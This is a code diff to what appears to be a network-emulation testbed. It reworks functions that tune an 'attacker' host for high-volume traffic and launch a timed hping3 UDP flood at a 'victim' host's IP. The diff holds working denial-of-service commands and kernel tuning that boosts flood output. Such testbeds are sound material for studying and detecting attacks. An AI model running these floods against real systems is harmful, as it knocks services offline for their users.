@@ -155,168 +155,91 @@ def launch_attack_smart(attacker: Host, victim: Host, duration: int = 15,
 
 def prepare_attacker_for_dos(attacker: Host):
     """Prepare a host to launch high-volume attacks."""
-    # Increase file descriptor limit
-    attacker.cmd("ulimit -n 65535")
-    
-    # Increase socket buffer sizes
-    attacker.cmd("sysctl -w net.core.wmem_max=134217728 2>/dev/null")
-    attacker.cmd("sysctl -w net.core.rmem_max=134217728 2>/dev/null")
-    attacker.cmd("sysctl -w net.core.wmem_default=16777216 2>/dev/null")
-    attacker.cmd("sysctl -w net.core.rmem_default=16777216 2>/dev/null")
-    
-    # Increase network buffer sizes
-    attacker.cmd("sysctl -w net.ipv4.udp_wmem_min=16384 2>/dev/null")
-    attacker.cmd("sysctl -w net.ipv4.udp_rmem_min=16384 2>/dev/null")
-    
-    # Disable connection tracking for better performance
-    attacker.cmd("sysctl -w net.netfilter.nf_conntrack_max=0 2>/dev/null")
-    
-    # Store original values for cleanup
+    # Store original values BEFORE modifying them
     if not hasattr(attacker, '_original_sysctl'):
         attacker._original_sysctl = {
             'wmem_max': attacker.cmd("sysctl -n net.core.wmem_max 2>/dev/null").strip(),
             'rmem_max': attacker.cmd("sysctl -n net.core.rmem_max 2>/dev/null").strip(),
         }
-    
+
+    attacker.cmd("ulimit -n 65535")
+    attacker.cmd("sysctl -w net.core.wmem_max=134217728 2>/dev/null")
+    attacker.cmd("sysctl -w net.core.rmem_max=134217728 2>/dev/null")
+    attacker.cmd("sysctl -w net.core.wmem_default=16777216 2>/dev/null")
+    attacker.cmd("sysctl -w net.core.rmem_default=16777216 2>/dev/null")
+    attacker.cmd("sysctl -w net.ipv4.udp_wmem_min=16384 2>/dev/null")
+    attacker.cmd("sysctl -w net.ipv4.udp_rmem_min=16384 2>/dev/null")
+    attacker.cmd("sysctl -w net.netfilter.nf_conntrack_max=0 2>/dev/null")
+
     debug(f"Prepared {attacker.name} for DoS attacks")
 
 
 def cleanup_attacker_after_dos(attacker: Host):
-    """Restore original settings after DoS attack."""
-    if hasattr(attacker, '_original_sysctl'):
-        orig = attacker._original_sysctl
-        
-        # Restore original values
-        if orig.get('wmem_max'):
-            attacker.cmd(f"sysctl -w net.core.wmem_max={orig['wmem_max']} 2>/dev/null")
-        if orig.get('rmem_max'):
-            attacker.cmd(f"sysctl -w net.core.rmem_max={orig['rmem_max']} 2>/dev/null")
-        
-        debug(f"Cleaned up {attacker.name} after DoS attack")
-    
-    # Kill any remaining hping3 processes
-    attacker.cmd("killall -9 hping3 2>/dev/null")
-    
-    # Clean up temp files
-    attacker.cmd("rm -f /tmp/hping3_*.log 2>/dev/null")
+    """Restore original settings after DoS attack. Safe even if shell is busy."""
+    try:
+        if hasattr(attacker, '_original_sysctl'):
+            orig = attacker._original_sysctl
+            if orig.get('wmem_max'):
+                attacker.cmd(f"sysctl -w net.core.wmem_max={orig['wmem_max']} 2>/dev/null")
+            if orig.get('rmem_max'):
+                attacker.cmd(f"sysctl -w net.core.rmem_max={orig['rmem_max']} 2>/dev/null")
+            debug(f"Cleaned up {attacker.name} after DoS attack")
+    except Exception:
+        pass
+    try:
+        attacker.cmd("killall -9 hping3 2>/dev/null")
+    except Exception:
+        pass
+    try:
+        attacker.cmd("rm -f /tmp/hping3_*.log 2>/dev/null")
+    except Exception:
+        pass
 
 
 def launch_udp_flood(attacker: Host, victim: Host, duration: int = 15):
     """
-    Launch a DoS attack with robust process monitoring and auto-restart.
+    Launch a UDP flood attack.
+
+    Uses 'timeout' so hping3 auto-terminates after `duration` seconds —
+    no polling loop, so the attacker shell stays free for the framework.
+    Same pattern as launch_tcp_syn_flood / launch_icmp_flood.
     """
-    information(Fore.RED + f"{attacker.name} launching UDP flood on {victim.name} for duration {duration}\n" + Fore.WHITE)
+    information(Fore.RED + f"{attacker.name} launching UDP flood on {victim.name} for {duration}s\n" + Fore.WHITE)
     victim_ip = victim.IP()
 
-    # Ensure `hping3` is installed
-    hping_check = attacker.cmd("which hping3")
-    if not hping_check.strip():
-        msg = f"{attacker.name} does not have hping3 installed."
-        error(msg)
+    if not attacker.cmd("which hping3").strip():
+        error(f"{attacker.name} does not have hping3 installed.")
         return False
-    
-    # Prepare attacker
-    prepare_attacker_for_dos(attacker)
-    
-    # Create log files
-    log_file = f"/tmp/hping3_{attacker.name}_{int(time.time())}.log"
-    pid_file = f"/tmp/hping3_{attacker.name}.pid"
-    
-    try:
-        # Start hping3 with proper backgrounding
-        # Use 'setsid' to detach from terminal and prevent signal propagation
-        attack_cmd = f"setsid nohup hping3 --flood --udp {victim_ip} > {log_file} 2>&1 & echo $! > {pid_file}"
-        attacker.cmd(attack_cmd)
-        
-        time.sleep(0.5)
-        
-        # Get the PID from file (more reliable)
-        pid = attacker.cmd(f"cat {pid_file} 2>/dev/null").strip()
-        
-        if not pid:
-            error(Fore.RED + f"Failed to get PID for hping3 on {attacker.name}\n" + Fore.WHITE)
-            log_content = attacker.cmd(f"cat {log_file} 2>&1")
-            error(f"hping3 startup log: {log_content}")
-            cleanup_attacker_after_dos(attacker)
-            return False
-        
-        # Verify process is actually running
-        verify = attacker.cmd(f"ps -p {pid} -o pid=").strip()
-        if not verify:
-            error(Fore.RED + f"hping3 PID {pid} not found immediately after start\n" + Fore.WHITE)
-            cleanup_attacker_after_dos(attacker)
-            return False
-        
-        debug(f"hping3 started with PID {pid}")
-        
-        # Monitor the attack with auto-restart capability
-        restart_count = 0
-        max_restarts = 2
-        elapsed_time = 0
-        check_interval = 1  # Check every second
-        
-        while elapsed_time < duration:
-            process_check = attacker.cmd(f"ps -p {pid} -o pid=").strip()
-            
-            if not process_check:
-                error(Fore.YELLOW + f"hping3 process (PID {pid}) stopped at second {elapsed_time}\n" + Fore.WHITE)
-                
-                # Check log for errors
-                log_content = attacker.cmd(f"cat {log_file} 2>&1")
-                debug(f"hping3 log at failure: {log_content[:300]}")
-                
-                # Try to restart if we haven't exceeded restart limit
-                if restart_count < max_restarts and elapsed_time < duration - 5:
-                    restart_count += 1
-                    information(Fore.YELLOW + f"Attempting to restart hping3 (attempt {restart_count}/{max_restarts})\n" + Fore.WHITE)
-                    
-                    # Restart with new PID
-                    attack_cmd = f"setsid nohup hping3 --flood --udp {victim_ip} >> {log_file} 2>&1 & echo $! > {pid_file}"
-                    attacker.cmd(attack_cmd)
-                    time.sleep(0.5)
-                    
-                    new_pid = attacker.cmd(f"cat {pid_file} 2>/dev/null").strip()
-                    if new_pid and attacker.cmd(f"ps -p {new_pid} -o pid=").strip():
-                        pid = new_pid
-                        information(Fore.GREEN + f"hping3 restarted with PID {pid}\n" + Fore.WHITE)
-                    else:
-                        error(Fore.RED + f"Failed to restart hping3\n" + Fore.WHITE)
-                        break
-                else:
-                    error(Fore.RED + f"Max restarts ({max_restarts}) exceeded or too close to end time\n" + Fore.WHITE)
-                    break
-            else:
-                debug(f"hping3 (PID {pid}) running at second {elapsed_time}")
-            
-            time.sleep(check_interval)
-            elapsed_time += check_interval
 
-        # Stop the attack
-        attacker.cmd(f"kill -9 {pid} 2>/dev/null")
+    prepare_attacker_for_dos(attacker)
+
+    try:
+        # setsid detaches from the shell's process group; timeout kills hping3 automatically
+        attack_cmd = (
+            f"setsid timeout {duration}s hping3 --flood --udp {victim_ip} "
+            f">/dev/null 2>&1 &"
+        )
+        attacker.cmd(attack_cmd)
         time.sleep(0.5)
-        attacker.cmd("killall -9 hping3 2>/dev/null")
-        
-        # Check final output
-        final_log = attacker.cmd(f"cat {log_file} 2>&1")
-        debug(f"hping3 final log: {final_log[:500]}")
-        
-        success = elapsed_time >= duration - 2  # Allow 2 second tolerance
-        
-        if success:
-            information(Fore.GREEN + f"{attacker.name} completed attack on {victim.name} (ran {elapsed_time}s of {duration}s)\n" + Fore.WHITE)
-        else:
-            error(Fore.RED + f"{attacker.name} attack on {victim.name} incomplete (ran {elapsed_time}s of {duration}s)\n" + Fore.WHITE)
-        
-        return success
-        
+
+        # Single verification — no polling loop that would occupy the shell
+        pid = attacker.cmd("pgrep -f 'hping3.*flood' | head -1").strip()
+        if not pid:
+            error(Fore.RED + f"Failed to start hping3 on {attacker.name}\n" + Fore.WHITE)
+            return False
+
+        information(Fore.RED + f"hping3 started (PID {pid}) on {attacker.name}\n" + Fore.WHITE)
+
+        # Wait for the attack to run; timeout command kills hping3 automatically
+        time.sleep(duration)
+        return True
+
     except Exception as e:
-        error(Fore.RED + f"Exception in launch_dos_attack: {type(e).__name__}: {str(e)}\n{traceback.format_exc()}" + Fore.WHITE)
+        error(Fore.RED + f"Exception in launch_udp_flood: {type(e).__name__}: {str(e)}\n"
+              f"{traceback.format_exc()}" + Fore.WHITE)
         return False
     finally:
-        # Always cleanup
         cleanup_attacker_after_dos(attacker)
-        # Clean up temp files
-        attacker.cmd(f"rm -f {log_file} {pid_file} 2>/dev/null")
 
 
 # Simpler version: Just use timeout and accept that it might stop early
